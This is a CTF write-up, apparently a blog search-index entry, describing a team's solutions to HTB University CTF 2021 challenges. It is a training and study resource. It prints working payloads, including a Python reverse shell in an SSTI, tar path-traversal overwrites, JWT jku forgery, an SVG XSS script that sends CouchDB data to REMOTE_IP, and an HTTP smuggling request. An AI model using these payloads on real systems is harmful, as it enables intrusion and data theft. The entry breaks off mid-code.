<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HTB Uni CTF 2021 Quals</title>
      <link href="/2021/11/22/HTB-Uni-CTF-2021-Quals/"/>
      <url>/2021/11/22/HTB-Uni-CTF-2021-Quals/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/header.png" alt="header displaying the logo of hackthebox&#39;s university CTF 2021"></p><p>The HTB UniCTF Qualifications 2021 took place from the 19.11.2021 to the 21.11.2021. We joined our universities team <a href="https://ctftime.org/team/140413">TeamWBH</a> and placed 26th out of 597 teams. </p><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>The CTF was definetly one of the harder ones we have done so far, but with a maximum team size of 10 students, 48 hours time and only 29 challenges they had to be really challenging to keep approximately 5000 students busy. We had lots of fun but overall we enjoy CTFs with more challenges of less difficulty a little bit more. There were challenges which easily could’ve been split into two or three challenges on their own because they required to chain a couple of vulnerabilites. This is of course very exciting once you solve these, but really frustrating if you spent a lot of time and only manage to get three out of four steps and therefore no reward at all. However the idea of having whole HTB-Boxes in the category “Full Pwn” was something really refreshing to see and instantly took our attention.</p><p>We want to showcase some challenges in the following. These are either challenges that we like the most or challenges that we think we are most likely to see again in other CTFs so we can come back to this post and reuse or gained knowledge.</p><h2 id="Fullpwn-GoodGames-user-amp-root"><a href="#Fullpwn-GoodGames-user-amp-root" class="headerlink" title="Fullpwn - GoodGames user &amp; root"></a>Fullpwn - GoodGames user &amp; root</h2><p>GoodGames was the easy Fullpwn Challenge. We had to exploit a <a href="https://book.hacktricks.xyz/pentesting-web/sql-injection">SQL Injection</a> and <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">SSTI</a> for the user own and abuse an insecure file mount to achieve root own.</p><h3 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>N/A</p><h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>We immediately see a front page on Port 80.</p><p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/good_games_fronpage.png" alt="screenshot of the front page of the web application on port 80"></p><p>Enumerating the machine we find a SQL Injection on the /login page and dump the entries with this payload:</p><pre><code class="bash">sqlmap -u &#39;http://goodgames.htb/login&#39; --data &#39;email=test%40test.htb&amp;password=12345&#39; -p &#39;email,password&#39; --method POST --dump</code></pre><pre><code>Database: mainTable: user[10 entries]+----+------------+---------------------------+----------------------------------+| id | name       | email                     | password                         |+----+------------+---------------------------+----------------------------------+| 1  | admin      | admin@goodgames.htb       | 2b22337f218b2d82dfc3b6f77e7cb8ec || 2  | test       | test@test.htb             | 827ccb0eea8a706c4c34a16891f84e7b |+----+------------+---------------------------+----------------------------------+</code></pre><p>We can crack the hash with <a href="https://crackstation.net/">crackstation</a>:</p><p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/crackstation.png" alt="sreenshot of the cracked hash"></p><p>We can now login as <code>admin:superadministrator</code> and find an admin panel at <code>internal-administration.goodgames.htb</code>. After adding the subdomain to our /etc/hosts file we can access it and login into the flask application using the same credentials again.</p><p>Flask applications in CTFs are most likely about SSTIs so that’s what we tried first. Changing the Full Name to the following gives us a reverse shell:</p><pre><code class="py">&#123;&#123;config.__class__.__init__.__globals__['os'].popen('python -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.103",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'').read()&#125;&#125;</code></pre><p>The user flag is located at <code>/home/augustus/user.txt</code>. We also find out, that we are in a docker instance.</p><p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/goodgames_userflag.png" alt="screenshot of the user.txt"></p><p>The privilege escalation is rather simple. Looking at the dockers subnet we assumed the host machine to be at 172.19.0.1 to which we can just ssh from within the reverse shell <code>ssh augustus@172.19.0.1</code> using <code>superadministrator</code> as the password again.</p><p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/goodgames_ssh.png" alt="ssh connection to the other ip"></p><p>We quickly realize that there are the same files in the home directory of the host machine as inside the docker. So we assumed an insecure mount. We can abuse this by simply copying bash to the home directory, log back into the docker where we are root and run <code>chown root:root bash &amp;&amp; chmod +s bash</code> to make it belong to root and set the suid bit. Now we can go back into the ssh session and run <code>./bash -p</code> to spawn a root shell.</p><p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/goodgames_root.png" alt="root pwnage demonstrated by setting the suid bit on bash"></p><h2 id="Web-Slippy"><a href="#Web-Slippy" class="headerlink" title="Web - Slippy"></a>Web - Slippy</h2><p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/slippy.png" alt="picture of the slippy fronpage displaying an upload field for tar.gz files"></p><p>This challenge was about a security issue in the tarfile python module. The issue is described <a href="https://bugs.python.org/issue21109">here</a>. Basically if you craft a malicious archive in which the files have <code>paths</code> set as their name the application would place that file on that path and even replace it if there is already a file present. Below is the source of the challenge where you can see the application extracting the files using tarfile from our uploaded archives.</p><pre><code class="py">import functools, tarfile, tempfile, osfrom application import maingenerate = lambda x: os.urandom(x).hex()def extract_from_archive(file):    tmp  = tempfile.gettempdir()    path = os.path.join(tmp, file.filename)    file.save(path)    if tarfile.is_tarfile(path):        tar = tarfile.open(path, &#39;r:gz&#39;)        tar.extractall(tmp)        extractdir = f&#39;&#123;main.app.config[&quot;UPLOAD_FOLDER&quot;]&#125;/&#123;generate(15)&#125;&#39;        os.makedirs(extractdir, exist_ok=True)        extracted_filenames = []        for tarinfo in tar:            name = tarinfo.name            if tarinfo.isreg():                filename = f&#39;&#123;extractdir&#125;/&#123;name&#125;&#39;                os.rename(os.path.join(tmp, name), filename)                extracted_filenames.append(filename)                continue                        os.makedirs(f&#39;&#123;extractdir&#125;/&#123;name&#125;&#39;, exist_ok=True)        tar.close()        return extracted_filenames    return False</code></pre><p><em>main.py</em></p><h3 id="Challenge-Description-1"><a href="#Challenge-Description-1" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>You’ve found a portal for a firmware upgrade service, responsible for the deployment and maintenance of rogue androids hunting humans outside the tractor city. The question is… what are you going to do about it?</p><h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h3><p>We tried different approaches, there might be even a possibility to just symlink to the flag, however we didn’t quite get that working so we came up with this nice trick. We just replaced the <code>routes.py</code> to add a new route which would just give us the flag. This is what our <code>malicious</code> routes.py looks like:</p><pre><code class="py">from flask import Blueprint, request, render_template, abort, send_filefrom application.util import extract_from_archiveimport osweb = Blueprint(&#39;web&#39;, __name__)api = Blueprint(&#39;api&#39;, __name__)@web.route(&#39;/&#39;)def index():    return render_template(&#39;index.html&#39;)@web.route(&#39;/test&#39;)def index2():    return send_file(&#39;/app/flag&#39;, attachment_filename=&#39;flag.txt&#39;)@api.route(&#39;/unslippy&#39;, methods=[&#39;POST&#39;])def cache():    if &#39;file&#39; not in request.files:        return abort(400)        extraction = extract_from_archive(request.files[&#39;file&#39;])    if extraction:        return &#123;&quot;list&quot;: extraction&#125;, 200    return &#39;&#39;, 204</code></pre><p><em>routes.py</em></p><p>As you can see on browsing /test it should send us the flag located at /app/flag as flag.txt. We created the malicious tar-file with <a href="https://github.com/ptoomey3/evilarc">evilarc</a> using this syntax:</p><pre><code>python evilarc.py routes.py -o unix -d 3 -p &#39;blueprints/&#39; -f test.tar.gz</code></pre><p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/slippy_solution.png" alt="screenshot displaying the successful exploit of the slippy web challenge"></p><h2 id="Web-SteamCoin"><a href="#Web-SteamCoin" class="headerlink" title="Web - SteamCoin"></a>Web - SteamCoin</h2><p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/steamcoin.png" alt="picture of the slippy fronpage displaying a login form and the possibility to register"></p><p>This challenge is one of the <code>chaining exploits to get a flag</code> challenges. Before we go into it we want to make clear that we did not manage to get the flag during the competition but wanted to share this challenge anyways because it is really well designed and a lot of fun. We will point out during the solution part how far we got and where we got stuck.</p><h3 id="Challenge-Description-2"><a href="#Challenge-Description-2" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>Meet SteamCoin, the first decentralized cryptocurrency of the SteamPunk realm that provides you the liberty to exchange value without intermediaries and translates to greater control of funds and lower fees. Sign up today in our SteamCoin wallet to get equipped with the tools and information you need to buy, sell, trade, invest, and spend SteamCoins.</p><h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h3><p>Before looking at the source we have a look at the webpage and see what obvious things we can do. We can register a new account, login to it and upload a <code>verification document</code> on the settings tab. We also get a JWT cookie so let’s have a look at that with <a href="https://jwt.io/">jwt.io</a>.</p><p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/jwt.png" alt="picture of the decoded JWT token"></p><p>The <code>jku-header</code> is set with an url to the jwks.json file containing the public key. This is already a sign for <a href="https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens#jku">jku Claim Misuse</a>. This is basically a vulnerability where we would craft our own key-pair and send an URL pointing to our own public key in the <code>jku-header</code>. This allows us to have a valid signature while modifying the payload and achieve session/account takeover. </p><p>Having a look inside the <code>AuthMiddleware.js</code> however, prevents the <code>jku Claim Misuses</code> with this check:</p><pre><code class="js">if (header.jku.lastIndexOf(&#39;http://localhost:1337/&#39;, 0) !== 0) &#123;    return res.status(500).send(response(&#39;The JWKS endpoint is not from localhost!&#39;));&#125;</code></pre><p><em>AuthMiddleWare.js</em></p><p>So it is not possible to point to our own public key… or is it? The public key has to be somewhere on localhost, but wasn’t there a file upload in the settings tab? Looking at the source code again we find out, that the file upload page only checks for the file ending, not the magic numbers or anything else:</p><pre><code class="js">const isValidFile = (file) =&gt; &#123;     return [        &#39;jpg&#39;,        &#39;png&#39;,        &#39;svg&#39;,        &#39;pdf&#39;    ].includes(file.name.split(&#39;.&#39;).slice(-1)[0])&#125;</code></pre><p><em>routes/index.js</em></p><p>So we can simply create our keypair, create a jwk.json file containing our public key and rename it to end on .svg for example.</p><p>To create the keypair we do as <a href="https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens#jku">HackTricks</a> describes:</p><pre><code>openssl genrsa -out keypair.pem 2048openssl rsa -in keypair.pem -pubout -out publickey.crtopenssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key</code></pre><p>Now we just download the original public key and change it to contain our values. To extract the values from our key we use <a href="https://irrte.ch/jwt-js-decode/pem2jwk.html">this site</a>.</p><p>After that we rename it to end on .svg and upload it.</p><p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/steamcoin_jwt.png" alt="upload successfull message"></p><p>Now we can change the payload in our jwt token to have <code>admin</code> as the username and the <code>jku-header</code> to point to <code>http://localhost:1337/uploads/cc56a3837236e1fd67928df1dd9a9c5c.svg</code></p><p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/steamcoin_jwt_tampered.png" alt="tampered jwt token"></p><p>To continue we need to have a look at the source code:</p><pre><code class="js">router.post(&#39;/api/test-ui&#39;, AuthMiddleware, (req, res) =&gt; &#123;    return db.getUser(req.data.username)        .then(user =&gt; &#123;            if (user.username !== &#39;admin&#39;) return res.status(403).send(response(&#39;You are not an admin!&#39;));            let &#123; path, keyword &#125; = req.body;            if (path, keyword) &#123;                if (path.startsWith(&#39;/&#39;)) path = path.replace(&#39;/&#39;,&#39;&#39;);                return ui_tester.testUI(path, keyword)                    .then(resp =&gt; res.send(response(resp)))                    .catch(e =&gt; res.send(response(e.toString())));            &#125;            return res.status(500).send(&#39;Missing required parameters!&#39;);        &#125;)        .catch(() =&gt; res.status(500).send(response(&#39;Authentication required!&#39;)));&#125;);</code></pre><p><em>routes/index.js</em></p><p>So we have an api endpoint at <code>/api/test-ui</code> that runs the <code>ui_tester.testUI</code> which is located in in the bot.js:</p><pre><code class="js">const testUI = async (path, keyword) =&gt; &#123;    return new Promise(async (resolve, reject) =&gt; &#123;        const browser = await puppeteer.launch(browser_options);        let context = await browser.createIncognitoBrowserContext();        let page = await context.newPage();        try &#123;            await page.goto(`http://127.0.0.1:1337/$&#123;path&#125;`, &#123;                waitUntil: &#39;networkidle2&#39;            &#125;);            await page.waitForTimeout(8000);                        await page.evaluate((keyword) =&gt; &#123;                return document.querySelector(&#39;body&#39;).innerText.includes(keyword)            &#125;, keyword)                .then(isMatch =&gt; resolve(isMatch));        &#125; catch(e) &#123;            reject(false);        &#125;        await browser.close();    &#125;);&#125;;</code></pre><p><em>bot.js</em></p><p>Trying to POST something to it however returns a <code>403 Forbidden, Request forbidden by administrative rules.</code></p><p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/steamcoin_post.png" alt="burp request displaying the 403 Forbidden"></p><p>So there has to be some kind of WAF, let’s have another look at the source. We can find the respective rule in <code>/config/haproxy.cfg</code>:</p><pre><code>frontend http-in    bind *:80    default_backend web    acl network_allowed src 127.0.0.1    acl restricted_page path_beg /api/test-ui    http-request deny if restricted_page !network_allowed</code></pre><p><em>/config/haproxy.cfg</em></p><p>There is a programm called <code>HAProxy</code> running which is a load balancer proxy server that is not allowing us to connect to that api endpoint unless we are from within the local network. Googling the version and name we quickly find <a href="https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/">this post about CVE-2021-40346</a> describing an integer overflow in the <code>Content-Length</code> header that allows to bypass these ACL rules we find in the haproxy.cfg by using HTTP request smuggeling. </p><p>This is where we got stuck during the contest, we were able to get HTTP request smuggeling to work, however it wouln’t bypass the ACL rules for some reasons that are still unknown to us to this point. So what follows is the intended way from the challenges author.</p><p>// FUNFACT: there was also an unintended bypass of the ACL rule because it wasn’t case sensitive. So a request to /Api/test-ui would’ve worked aswell.</p><p>To understand the full exploit we have to have another look at the source code:</p><pre><code class="js">class Database &#123;    async init() &#123;        this.couch = nano(&#39;http://admin:youwouldntdownloadacouch@localhost:5984&#39;);        await this.couch.db.create(&#39;users&#39;, (err) =&gt; &#123;              if (err &amp;&amp; err.statusCode != 412) &#123;                console.error(err);            &#125;            this.userdb = this.couch.use(&#39;users&#39;);            let adminUser = &#123;                  username: &#39;admin&#39;,                password: crypto.randomBytes(13).toString(&#39;hex&#39;),                verification_doc: &#39;HTB&#123;f4k3_fl4g_f0r_t3st1ng&#125;&#39;            &#125;;            this.userdb.insert(adminUser, adminUser.username)                .catch(() =&gt; &#123;&#125;);        &#125;);     &#125;</code></pre><p><em>database.js</em></p><p>The <code>database.js</code> leaks valid credentials for the couchdb database that hold the flag within the verification_doc column of the admin user. So the attack plan here is to bypass the ACL rule in HAProxy to let the <code>bot.js</code> <code>testUI()</code> send a request to the couchdb database that reads the flag. We can achieve this with a <a href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting">XSS</a> inside of another SVG file. So we first create another user and upload another SVG file containing this payload:</p><pre><code class="js">&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;   &lt;rect width=&quot;100&quot; height=&quot;100&quot; style=&quot;fill:rgb(0,0,64);stroke-width:3;stroke:rgb(0,0,0)&quot; /&gt;   &lt;script type=&quot;text/javascript&quot;&gt;        xhr = new XMLHttpRequest();        authToken = &quot;Basic &quot; + btoa(&#39;admin&#39; + &quot;:&quot; + &#39;youwouldntdownloadacouch&#39;);        xhr.open(&quot;POST&quot;, &quot;http://127.0.0.1:5984/_replicate&quot;,true);        xhr.setRequestHeader(&quot;Authorization&quot;, authToken);        xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;application/json;charset=UTF-8&quot;);        xhr.onload = function (e) &#123;        console.log(e);        &#125;;        xhr.onerror = function (e) &#123;        console.log(e);        &#125;;        xhr.send(`&#123;&quot;source&quot;:&quot;users&quot;,&quot;target&quot;:&#123;&quot;url&quot;:&quot;http://REMOTE_IP:5984/users&quot;,&quot;headers&quot;:&#123;&quot;Authorization&quot;:&quot;$&#123;authToken&#125;&quot;&#125;&#125;&#125;`);   &lt;/script&gt;&lt;/svg&gt;</code></pre><p>This is a simple script that sends a <a href="https://guide.couchdb.org/draft/replication.html">replication</a> request to the couchdb and passes it to our REMOTE_IP.</p><p>We can then trigger it with this HTTP request smuggeling request in Burp:</p><pre><code>POST /api/login HTTP/1.1Host: localhostContent-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:Content-Length: 787POST /api/test-ui HTTP/1.1Host: localhost:1337Content-Type: application/jsonCookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3Q6MTMzNy91cGxvYWRzLzc3MTNhMzM5MTFhZjZiMDJkMWE4YTQ5ODMxMjA5YWI3LnBkZiIsImtpZCI6ImYwZjAyMmNiLTUzMGMtNGI4ZC1iZmIyLWMyNTExZjMzZDcwOSJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjM2OTcwNjkzfQ.JEIPl2UC6akQDtx3u0nX2f6UygAIj8wkAwpaFZRBjUHMHXBQ2eWMmEz2pci49i7nWMHnwkjO7S_wgjlNQkqpESrY3VhU0tndLLeNu6P5BPPW2cEhVKBJp1ZQb1HoI7DaVMm3bidVK_Rc9FeUe_oieqYE7zXMLQ4WjRmz7yetvpr918gMlV-wmjT3o3xijs4Kql7PA1up6g0P8QRxw1DgV4ItX5AcPwltglEx-BOFir7e-3o4yTPg8JAslhZkTtvB5rjjuSZxal9OMB2gS8Xm31tdQXQHCX2XQyL_3ScVEiBKC6RzbjBILPznZCR6Dq1ZF8rYDDqRjSY-Es9oHC-qdAContent-Length: 75&#123;&quot;path&quot;:&quot;/uploads/efb023c476ff09fdd61142d575d77200.svg&quot;, &quot;keyword&quot;: &quot;test&quot;&#125;</code></pre><p>As we said earlier we didn’t manage to get the flag here but we had all the pieces, we even had some XSS attempts during the competition. It was a really nice challenge, kudos to <a href="https://twitter.com/makelariss">@makelariss</a> for designing it.</p><h2 id="Misc-Insane-Bolt"><a href="#Misc-Insane-Bolt" class="headerlink" title="Misc - Insane Bolt"></a>Misc - Insane Bolt</h2><p>This was an automation challenge. Once connected to the given ip and port we were sent some instructions on how to play and a maze to solve. The challenge was to solve 500 of these mazes within a short amount of time while always going the ideal way.</p><p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/insane_bolt.png" alt="screenshot of the netcat connection to the insane bolt challenge"></p><h3 id="Challenge-Description-3"><a href="#Challenge-Description-3" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>This insane scientist wants to craft the most powerful android in the world! Help him collect many 🔩 to achieve his goal. Also, he needs many 💎 to make it even more strong and pwoerful than any other android. Good luck adventurer!</p><h3 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h3><p>We wrote this simple python script to solve the challenge for us.</p><pre><code class="py">#!/usr/bin/python3# HTB UniCTF2021Quali InsaneBolt Challengeimport nclibflame = b&quot;\xf0\x9f\x94\xa5&quot;skull = b&quot;\xe2\x98\xa0\xef\xb8\x8f&quot;screw = b&quot;\xf0\x9f\x94\xa9&quot;diamond = b&quot;\xf0\x9f\x92\x8e&quot;robot = b&quot;\xf0\x9f\xa4\x96&quot;nc = nclib.Netcat((&#39;IP_ADRESS&#39;, PORT), verbose=False)start = &quot;&gt;&quot;recv = nc.recv_until(start.encode(&#39;utf-8&#39;))nc.send((&quot;2\n&quot;).encode())recv = nc.recv_until(start.encode(&#39;utf-8&#39;))first_run = Truecount_diamonds = 0solution = &quot;&quot;direction = 1while count_diamonds &lt; 500:    if (not first_run):        start = b&quot;\xf0\x9f\x94\xa9 !&quot;        recv = nc.recv_until(start)        start = &quot;&gt;&quot;        recv = nc.recv_until(start.encode(&#39;utf-8&#39;))    print(recv.decode())    content = recv.splitlines()        content.pop()    content.pop()    content.pop(0)    if (not first_run):        content.pop(0)    count_rows = len(content)    count_columns = content[0].count(b&#39; &#39;)    maze = []    for row in content:        row = row.split(b&quot; &quot;)        row.pop()        row = list(filter((b&#39;&#39;).__ne__, row))        maze.append(row)    direction = 1    solution = &quot;&quot;    position = [1,maze[1].index(robot)]    fallback = position    while position[1] &lt; count_rows -2:        row = position[0]        column = position[1]        if maze[row+1][column] == diamond:            solution = solution + &quot;D&quot;            count_diamonds = count_diamonds + 1            break;        elif maze[row+1][column] == screw:            solution = solution + &quot;D&quot;            position = [row+1,column]            fallback = position        elif maze[row][column-direction] == screw:            solution = solution + str(direction)            position = [row,column-direction]        else:            solution = solution.rstrip(str(direction))            position = fallback            direction = direction * (-1)    solution = solution.replace(&quot;-1&quot;,&quot;R&quot;)    solution = solution.replace(&quot;1&quot;,&quot;L&quot;)    solution = solution + &quot;\n&quot;    print(&quot;[+] Sending this solution: &quot; + solution.strip())    print(&quot;[+] You have &quot; + str(count_diamonds) + &quot; 💎!&quot;)    nc.send(solution.encode())    first_run = Falserecv = nc.recv_all();print(recv.decode().strip());</code></pre><p>As you can see, we took a simplified backtracking approach. We always try to step down. If there is an obstacle we try to go left or right. After each step down we save the current position in a <code>fallback</code> variable, so once we find ourselves in a dead end we can ‘go’ back to that position and delete the corresponding characters from our solution string.<br>Hence all steps are written in one string and sent at the and of each loop, we always get a clean solution without unnecessary steps. This way we managed to collect all the screws and diamonds we needed.</p><h2 id="Cloud-Epsilon"><a href="#Cloud-Epsilon" class="headerlink" title="Cloud - Epsilon"></a>Cloud - Epsilon</h2><p>This cloud challenge was about aws and a <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">SSTI</a>. We were given a whole machine where we had to use the given openvpn connection. </p><h3 id="Challenge-Description-4"><a href="#Challenge-Description-4" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>One of the local shops in your city is realising new costumes. Go grab them before they run out as the available stock is very limited.</p><h3 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h3><p>Since this is a whole machine we started with a nmap scan:</p><pre><code>╰─$ nmap -A 10.129.96.99Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-23 14:59 CETNmap scan report for epsilon.htb (10.129.96.99)Host is up (0.038s latency).Not shown: 997 closed tcp ports (conn-refused)PORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)80/tcp   open  http    Apache httpd 2.4.41| http-git:|   10.129.96.99:80/.git/|     Git repository found!|     Repository description: Unnamed repository; edit this file &#39;description&#39; to name the...|_    Last commit message: Updating Tracking API  # Please enter the commit message for...|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: 403 Forbidden5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)|_http-title: Costume Shop|_http-server-header: Werkzeug/2.0.2 Python/3.8.10Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><p>There is a .git on 80 and some kind of web application on port 5000:</p><p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/5000.png" alt="screenshot of the webapp on port 5000"></p><p>We didn’t manage to find anything on that web app so let’s get a look at that <a href="git-repo.zip">.git</a>.</p><p>There are two files (server.py and track_api_CR_148.py) in five commits. The commits are about adding and updating the ‘Tracking API Module’ a typo (‘epsilong’ vs. ‘epsilon’) and the addition of the custome site. </p><p>In the first commit we can find the data to use the lambda client:</p><pre><code class="python">session = Session(    aws_access_key_id=&#39;AQLA5M37BDN6FJP76TDC&#39;,    aws_secret_access_key=&#39;OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A&#39;,    region_name=&#39;us-east-1&#39;,    endpoint_url=&#39;http://cloud.epsilong.htb&#39;)aws_lambda = session.client(&#39;lambda&#39;)    </code></pre><p><em>/processed_git/0_[…]/track_api_CR_148.py</em></p><p>Using <code>aws configure</code> we can use this data for authorization in our aws lambda client.<br>Actually this got us access to the cloud:</p><pre><code class="bash"># aws lambda list-functions --endpoint-url http://cloud.epsilon.htb                              &#123;    &quot;Functions&quot;: [        &#123;            &quot;FunctionName&quot;: &quot;costume_shop_v1&quot;,            &quot;FunctionArn&quot;: &quot;arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1&quot;,            &quot;Runtime&quot;: &quot;python3.7&quot;,            &quot;Role&quot;: &quot;arn:aws:iam::123456789012:role/service-role/dev&quot;,            &quot;Handler&quot;: &quot;my-function.handler&quot;,            &quot;CodeSize&quot;: 478,            &quot;Description&quot;: &quot;&quot;,            &quot;Timeout&quot;: 3,            &quot;LastModified&quot;: &quot;2021-11-21T14:05:37.391+0000&quot;,            &quot;CodeSha256&quot;: &quot;IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=&quot;,            &quot;Version&quot;: &quot;$LATEST&quot;,            &quot;VpcConfig&quot;: &#123;&#125;,            &quot;TracingConfig&quot;: &#123;                &quot;Mode&quot;: &quot;PassThrough&quot;            &#125;,            &quot;RevisionId&quot;: &quot;1a5e201a-c8f3-4c1a-ad6d-366dc7ca3d33&quot;,            &quot;State&quot;: &quot;Active&quot;,            &quot;LastUpdateStatus&quot;: &quot;Successful&quot;,            &quot;PackageType&quot;: &quot;Zip&quot;        &#125;    ]&#125;</code></pre><p>The costume_shop seems to be related to the web application running on port 5000.<br>Let’s have a closer look:</p><pre><code class="bash"># aws lambda get-function --function-name costume_shop_v1 --endpoint-url http://cloud.epsilon.htb &#123;    &quot;Configuration&quot;: &#123;        &quot;FunctionName&quot;: &quot;costume_shop_v1&quot;,        &quot;FunctionArn&quot;: &quot;arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1&quot;,        &quot;Runtime&quot;: &quot;python3.7&quot;,        &quot;Role&quot;: &quot;arn:aws:iam::123456789012:role/service-role/dev&quot;,        &quot;Handler&quot;: &quot;my-function.handler&quot;,        &quot;CodeSize&quot;: 478,        &quot;Description&quot;: &quot;&quot;,        &quot;Timeout&quot;: 3,        &quot;LastModified&quot;: &quot;2021-11-21T14:05:37.391+0000&quot;,        &quot;CodeSha256&quot;: &quot;IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=&quot;,        &quot;Version&quot;: &quot;$LATEST&quot;,        &quot;VpcConfig&quot;: &#123;&#125;,        &quot;TracingConfig&quot;: &#123;            &quot;Mode&quot;: &quot;PassThrough&quot;        &#125;,        &quot;RevisionId&quot;: &quot;1a5e201a-c8f3-4c1a-ad6d-366dc7ca3d33&quot;,        &quot;State&quot;: &quot;Active&quot;,        &quot;LastUpdateStatus&quot;: &quot;Successful&quot;,        &quot;PackageType&quot;: &quot;Zip&quot;    &#125;,    &quot;Code&quot;: &#123;        &quot;Location&quot;: &quot;http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code&quot;    &#125;,    &quot;Tags&quot;: &#123;&#125;&#125;</code></pre><p>Nice! We found some code on the webpage at the provided link:</p><pre><code class="js">import jsonsecret=&#39;RrXCv`mrNe!K!4+5`wYq&#39; #apigateway authorization for CR-124&#39;&#39;&#39;Beta release for tracking&#39;&#39;&#39;def lambda_handler(event, context):    try:        id=event[&#39;queryStringParameters&#39;][&#39;order_id&#39;]        if id:            return &#123;               &#39;statusCode&#39;: 200,               &#39;body&#39;: json.dumps(str(resp)) #dynamodb tracking for CR-342            &#125;        else:            return &#123;                &#39;statusCode&#39;: 500,                &#39;body&#39;: json.dumps(&#39;Invalid Order ID&#39;)            &#125;    except:        return &#123;                &#39;statusCode&#39;: 500,                &#39;body&#39;: json.dumps(&#39;Invalid Order ID&#39;)            &#125;</code></pre><p><em>lambda_function.py</em></p><p>The secret we see there is used for the jwt on port 5000. We can use this to craft our own token:</p><p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/epsilon_jwt.png" alt="jwt.io showing the self crafted token"></p><p>The <code>server.py</code> tells us we should be allowed to visit the <code>/order</code> page by using the crafted jwt token as an auth cookie now:</p><p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/helloadmin.png" alt="screenshot of the web page /order with &#39;Welcome Admin&#39; and the order form"></p><p>Let`s have a closer look how to step further:</p><pre><code class="py">@app.route(&#39;/order&#39;,methods=[&quot;GET&quot;,&quot;POST&quot;])def order():    if verify_jwt(request.cookies.get(&#39;auth&#39;),secret):        if request.method==&quot;POST&quot;:            costume=request.form[&quot;costume&quot;]            message = &#39;&#39;&#39;            Your order of &quot;&#123;&#125;&quot; has been placed successfully.            &#39;&#39;&#39;.format(costume)            tmpl=render_template_string(message,costume=costume)            return render_template(&#39;order.html&#39;,message=tmpl)        else:            return render_template(&#39;order.html&#39;)    else:        return 